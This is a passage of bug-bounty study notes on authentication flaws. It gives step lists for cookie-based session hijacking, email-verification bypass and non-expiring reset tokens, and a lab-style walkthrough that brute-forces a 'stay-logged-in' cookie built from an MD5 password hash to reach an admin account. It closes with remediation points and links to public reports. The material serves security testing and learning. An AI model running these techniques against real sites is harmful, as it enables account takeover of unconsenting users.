    ### Session Hijacking (Intended Behavior)
    
    ```
        1.Create your account    2.Login your account    3.Use cookie editor extension in browser    4.Copy all the target cookies    5.Logout your account    6.Paste that cookies in cookie editor extension    7.Refresh page if you are logged in than this is a session hijacking
    ```
    
    `Impact:` If attacker get cookies of victim it will leads to account takeover.
    
    ### Password reset token does not expire (Insecure Configurability)
    
    ```
          1.Create your account on target Site.      2.request for a forget password token.      3.Don't use that link      4.Instead logged in with your old password and change your email to other.      5.Now use that password link sents to old email and check if you are able to change your password if yes than there is the litle bug.
    ```
    
    ### Server security misconfiguration -> Lack of security headers -> Cache control for a security page
    
    ```
        1. Login to the application    2. Navigate around the pages    3. Logout    4. Press (Alt+left-arrow) buttons    5. If you are logged in or can view the pages navigated by the user. Then you found a bug.
    ```
    
    `Impact:` At a PC cafe, if a person was in a very important page with alot of details and logged out, then another person comes and clicks back (because he didnt close the browser) then data is exposed. User information leaked
    
    ### Broken Authentication To Email Verification Bypass (P4) :
    
    `category` : P4 >> Broken Authentication and Session Management >> Failure to Invalidate Session >> On Password Reset and/or Change
    
    ```
        1) First You need to make a account & You will receive a Email verification link.    2) Application in my case give less Privileges & Features to access if not verified.    3) Logged into the Application & I change the email Address to Email B.    4) A Verification Link was Send & I verified that.    5) Now I again Changed the email back to Email I have entered at the time of account creation.    6) It showed me that my Email is Verified.    7) Hence , A Succesful Email verfication Bypassed as I haven't Verified the Link which was sent to me in the time of account creation st  ill my email got verified.    8) Didn't Receive any code again for verification when I changed back my email & When I open the account it showed in my Profile that its Verified Email.
    ```
    
    `Impact` :  
    Email Verfication was bypassed due to Broken Authentication Mechanism , Thus more Privileged account can be accessed by an attacker making website prone to Future Attacks.
    
    Happy Hacking:)
    
    ### Email Verification Bypass (P3/P4)
    
    ```
     1)First You need to Create an account with Your Own Email Address. 2)After Creating An Account A Verification Link will be sent to your account. 3)Dont Use The Email Verification link. Change Your Email to Victim's Email. 4)Now Go in Your Email and Click on Your Own Email Verification Link. 5)if the Victim's Email Get Verified then This is a Bug.
    ```
    
    `Impact` : Email Verfication Bypass
    
- **==Remember me==**
    
    # **Cookie:**
    
    To identify user and maintain the session are issued by the website and these are stored in your file storage by your browser. Cookies are created when user browse any website just to keep track of your movements within that website, remembering your login. Cookie allow server to store and retrieve data from the client the data can be such as a unique id assigned to client by the website etc.
    
    **Type**: There are two types of cookie:
    
    · **Session cookie:** It is used to check authenticity of user and are only assigned when your logs into the website.
    
    · **Persistent cookie:** Persistent cookie remains in the browser’s subfolder for the duration period set within the cookie’s file and they can be used for analytics and other purposes.
    
    **Example:**
    
    [![](https://miro.medium.com/v2/resize:fit:697/1*F3BDUBS62G72uHIyoJJofQ.png)](https://miro.medium.com/v2/resize:fit:697/1*F3BDUBS62G72uHIyoJJofQ.png)
    
    **Need:** HTTP is stateless, So every request is unique for the server. So to keep client authenticated website issues cookie which can be send along the request to tell the server that Hey !! I was authenticated earlier and here is the cookie.
    
    **Set Cookie:** whenever the browser connects to a website which want to issue the cookie to the client, so in this case website includes a “Set:Cookie” header in the response of that request which defines the cookie which the website is setting up. After assigning the cookie to the user they are automatically added to the subsequent request sent to that particular website.
    
    Cookie have below mentioned attributes:
    
    · **Name:** The information like name of cookie which is assigned by the server. The name let the server differentiate amongst the session cookie and others one such as session cookie is named as session_id and other cookie named as analytics cookie.
    
    · **Expire:** The maximum lifetime of the cookie. It will expire after the time specified in the expiration time.
    
    · **Domain:** Domain specify host to which the cookie will be sent if user makes a request to the url specified in the domain request the cookie will be automatically included in the request.
    
    i. If we omitted to set it, it will send only main domain value not include subdomain in it.
    
    ii. If a domain is specified then subdomains are always included.
    
    This cookie will be valid for all “facebook” domain and subdomain like ***.facebook.com**. Any domain, which ends with facebook.com the cookie will valid for all the subdomains.
    
    · **Path:** A path that must exist in the requested URL, or the browser would not send the cookie header. After domain we can give path with /.
    
    · **Secure:** A secure cookie is only added to the request if the request is going on the port 443.
    
    In the above cookie secure flag is set. So if we try to send the request on port 80 the cookie will not be included in the request.
    
    Request:
    
    [![](https://miro.medium.com/v2/resize:fit:371/1*6xUVe-7cLuWj3U9J0FwwOw.png)](https://miro.medium.com/v2/resize:fit:371/1*6xUVe-7cLuWj3U9J0FwwOw.png)
    
    The cookie doesn’t get included since the request is going on the port 443
    
    · **Httponly:** if the cookie have this flag set then the cookie can’t be accessed by the client side javascripts. what I get into console and type So if I try to do “alert(document.cookie)” to check cookie value.
    
    You can clearly see that the cookie is not included in the Popup or the alert box
    
    [![](https://miro.medium.com/v2/resize:fit:356/1*-vCFGWC5LRB51_DvHM-lRQ.png)](https://miro.medium.com/v2/resize:fit:356/1*-vCFGWC5LRB51_DvHM-lRQ.png)
    
    · **SameSite:** If you want to restrict to a first-party or same-site context.
    
    i. As gupta.facebook.com is part of *.facebook.com. So if gupta.facebook.com wants to include some images from main facebook domain i.e. same-site request.
    
    ii. As gupta.facebook.com asking some image from test.facebook.com i.e. cross-site request.
    
    Same site cookie has 3 attributes:
    
    **· Lax:** This is default value set in today’s browser so cookie without samesite attribute will be treated as Lax attribute is set. Cookie will be send with top-level navigations.
    
    **· Strict:** Cookie only send with one party request not with 3 party initiator.
    
    **· None:** It means cookie will be sending with all request i.e. sending cross-site request is also allowed.
    
    **Note**: Neither Strict nor Lax are a complete solution. Cookie are send as a part of user’s request. That is means sanitizing and validating the input.
    
    Let exploit a vulnerability corresponding to the cookie
    
    # **Working/Exploiting:**
    
    On login, we have an option to choose whether we want to get logged in to the website or not if choose “Stay logged” in functionality it assigns a attribute in the cookie.
    
    [![](https://miro.medium.com/v2/resize:fit:677/1*5MAVqzbRvnZ6IiTZ6s1GUQ.png)](https://miro.medium.com/v2/resize:fit:677/1*5MAVqzbRvnZ6IiTZ6s1GUQ.png)
    
    As I forward this request, it actually adds a cookie value to it which can be used for further authentication.
    
    [![](https://miro.medium.com/v2/resize:fit:700/1*qCRdwJBITsGKa9dJ-rTw4g.png)](https://miro.medium.com/v2/resize:fit:700/1*qCRdwJBITsGKa9dJ-rTw4g.png)
    
    Cookie header in the above request has 2 attributes.
    
    **Session**: Session that identify the logged in user.
    
    **Stay-logged-in**: It also have long alphanumeric values which will login the user if the original cookie expires. Let try to do a bit research on the cookie.
    
    [![](https://miro.medium.com/v2/resize:fit:655/1*_NGszP8JOBN62Cdp3V2Zew.png)](https://miro.medium.com/v2/resize:fit:655/1*_NGszP8JOBN62Cdp3V2Zew.png)
    
    Forward this above request to intruder and remove session attribute from cookie, as we want to get the user logged in using the stay-logged-in cookie.
    
    It seems that the cookie is base64 encoded, lets try to decode this
    
    [![](https://miro.medium.com/v2/resize:fit:494/1*huArFdb9r_e4r4y81xmLUA.png)](https://miro.medium.com/v2/resize:fit:494/1*huArFdb9r_e4r4y81xmLUA.png)
    
    So after decoding we can see that the cookie has two attributes one is my username and other is a string which looks like an hash.
    
    Upon inspecting I found that this an md5 hash so I cracked it using any md5 cracker and found that the md5 hash was the password of my account.
    
    So lets try to crack the stay_logged_in cookie to do an authentication bypass for the other user.
    
    Therefore, we forward the above request in intruder and start brute forcing the _**stay-logged-in cookie**_ attribute.
    
    Request in Intruder
    
    [![](https://miro.medium.com/v2/resize:fit:695/1*2N7gEDvnzbf6HOhVTUNgew.png)](https://miro.medium.com/v2/resize:fit:695/1*2N7gEDvnzbf6HOhVTUNgew.png)
    
    To brute force the password, I need one password list. Here I am taking any standard password list from google and pasting that list in intruder.
    
    [![](https://miro.medium.com/v2/resize:fit:487/1*xPUIhl4vMD8owNE02lCpjA.png)](https://miro.medium.com/v2/resize:fit:487/1*xPUIhl4vMD8owNE02lCpjA.png)
    
    **How to set Payload Processing**
    
    Since the cookie in base64 encoded and even the password was in md5 so to bruteforce the cookie there is a need of payload processing.
    
    Let’s use the payload processing
    
    i. Convert the wordlist( one by one) into md5 hashed
    
    ii. Add prefix _**admin:**_ into hashed password
    
    iii. Base 64 encoding of combination(username and hashed password)
    
    [![](https://miro.medium.com/v2/resize:fit:508/1*2q9wTOhJdZ1-oCkKZAAq6w.png)](https://miro.medium.com/v2/resize:fit:508/1*2q9wTOhJdZ1-oCkKZAAq6w.png)
    
    After all the setting, I start the intruder attack
    
    [![](https://miro.medium.com/v2/resize:fit:645/1*E8qgZqWIX_RUPEpkrnsw5w.png)](https://miro.medium.com/v2/resize:fit:645/1*E8qgZqWIX_RUPEpkrnsw5w.png)
    
    So as you can see in the above request we are able to get the stay_logged_in cookie for the admin. We can use that cookie to get the access to the admin account.
    
    [![](https://miro.medium.com/v2/resize:fit:700/1*bHM9ce4nw_0zWKYa0REztw.png)](https://miro.medium.com/v2/resize:fit:700/1*bHM9ce4nw_0zWKYa0REztw.png)
    
    # **Remediation:**
    
    1. The stay_logged_in or remember me functionality should have to be implemented properly.
    
    2. The username and the password of the user shouldn’t have to be used in the cookie as it may lead to the leakage of the password.
    
- ==**Reports + Writeups**==
    
    1. [Potential pre-auth RCE on Twitter VPN](https://hackerone.com/reports/591295) to Twitter - 1157 upvotes, $20160
    2. [Improper Authentication - any user can login as other user with otp/logout & otp/login](https://hackerone.com/reports/921780) to Snapchat - 891 upvotes, $25000
    3. [Subdomain Takeover to Authentication bypass](https://hackerone.com/reports/335330) to Roblox - 718 upvotes, $2500
    4. [[ RCE ] Through stopping the redirect in /admin/* the attacker able to bypass Authentication And Upload Malicious File](https://hackerone.com/reports/683957) to [Mail.ru](http://mail.ru/) - 340 upvotes, $4000
    5. [Shopify admin authentication bypass using partners.shopify.com](https://hackerone.com/reports/270981) to Shopify - 287 upvotes, $20000
    6. [Bypass Password Authentication for updating email and phone number - Security Vulnerability](https://hackerone.com/reports/770504) to Twitter - 260 upvotes, $700
    7. [Spring Actuator endpoints publicly available and broken authentication](https://hackerone.com/reports/838635) to LINE - 223 upvotes, $12500
    8. [Misuse of an authentication cookie combined with a path traversal on app.starbucks.com permitted access to restricted data](https://hackerone.com/reports/876295) to Starbucks - 221 upvotes, $4000
    9. [Through blocking the redirect in /* the attacker able to bypass Authentication To see Sensitive Data sush as Game Keys , Emails ,..](https://hackerone.com/reports/736273) to Razer - 196 upvotes, $1000
    10. [Authentication bypass on auth.uber.com via subdomain takeover of saostatic.uber.com](https://hackerone.com/reports/219205) to Uber - 165 upvotes, $5000
    11. [Web Authentication Endpoint Credentials Brute-Force Vulnerability](https://hackerone.com/reports/127844) to HackerOne - 151 upvotes, $1500
    12. [2-factor authentication can be disabled when logged in without confirming account password](https://hackerone.com/reports/783258) to Localize - 144 upvotes, $500
    13. [[c-api.city-mobil.ru] Client authentication bypass leads to information disclosure](https://hackerone.com/reports/772118) to [Mail.ru](http://mail.ru/) - 143 upvotes, $8000
    14. [Incorrect param parsing in Digits web authentication](https://hackerone.com/reports/126522) to Twitter - 122 upvotes, $2520
    15. [RCE/LFI on test Jenkins instance due to improper authentication flow](https://hackerone.com/reports/258117) to Snapchat - 102 upvotes, $5000
    16. [Thailand - a small number of SMB CCTV footage backup servers were accessible without authentication.](https://hackerone.com/reports/417360) to Starbucks - 92 upvotes, $0
    17. [User account compromised authentication bypass via oauth token impersonation](https://hackerone.com/reports/739321) to Picsart - 91 upvotes, $0
    18. [SAML Authentication Bypass on uchat.uberinternal.com](https://hackerone.com/reports/223014) to Uber - 82 upvotes, $8500
    19. [Account Takeover via SMS Authentication Flow](https://hackerone.com/reports/1245762) to Zenly - 82 upvotes, $1750
    
    # write-ups
    
    - [Touch ID authentication Bypass on evernote and dropbox iOS apps](https://medium.com/@pig.wig45/touch-id-authentication-bypass-on-evernote-and-dropbox-ios-apps-7985219767b2)
    - [Oauth authentication bypass on airbnb acquistion using wierd 1 char open redirect](https://xpoc.pro/oauth-authentication-bypass-on-airbnb-acquisition-using-weird-1-char-open-redirect/)
    - [Two factor authentication bypass](https://gauravnarwani.com/two-factor-authentication-bypass/)
    - [Instagram multi factor authentication bypass](https://medium.com/@vishnu0002/instagram-multi-factor-authentication-bypass-924d963325a1)
    - [Authentication bypass in nodejs application](https://medium.com/@_bl4de/authentication-bypass-in-nodejs-application-a-bug-bounty-story-d34960256402)
    - [Symantec authentication Bypass](https://artkond.com/2018/10/10/symantec-authentication-bypass/)
    - [[a]]
    - [Slack SAML authentocation bypass](https://blog.intothesymmetry.com/2017/10/slack-saml-authentication-bypass.html)
    - [Authentication bypass on UBER's SSO](https://www.arneswinnen.net/2017/06/authentication-bypass-on-ubers-sso-via-subdomain-takeover/)
    - [Authentication Bypass on airbnb via oauth tokens theft](https://www.arneswinnen.net/2017/06/authentication-bypass-on-airbnb-via-oauth-tokens-theft/)
    - [Inspect element leads to stripe account lockout authentication Bypass](https://www.jonbottarini.com/2017/04/03/inspect-element-leads-to-stripe-account-lockout-authentication-bypass/)
    - [Authentication bypass on SSO ubnt.com](https://www.arneswinnen.net/2016/11/authentication-bypass-on-sso-ubnt-com-via-subdomain-takeover-of-ping-ubnt-com/)